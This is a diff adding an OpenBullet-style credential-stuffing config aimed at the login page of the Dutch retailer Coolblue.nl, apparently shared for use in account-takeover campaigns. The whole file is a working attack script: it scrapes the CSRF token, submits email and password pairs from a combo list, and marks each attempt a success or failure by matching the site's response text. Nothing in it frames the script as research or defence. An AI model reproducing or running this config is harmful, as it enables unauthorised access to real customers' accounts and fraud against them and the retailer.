@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Coolblue.nl",
+  "SuggestedBots": 1,
+  "LastModified": "2019-06-05T20:48:27.4677574-07:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "JarlosBenda",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.coolblue.nl/en/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"csrf\"       value=\"" "\"" -> VAR "CSRF" 
+
+REQUEST POST "https://www.coolblue.nl/en/login" 
+  CONTENT "emailaddress=<USER>&password=<PASS>&csrf=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.coolblue.nl" 
+  HEADER "referer: https://www.coolblue.nl/en/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "You're logged in as " 
+  KEYCHAIN Failure OR 
+    KEY "The email address and password combination is not known to us." 
+
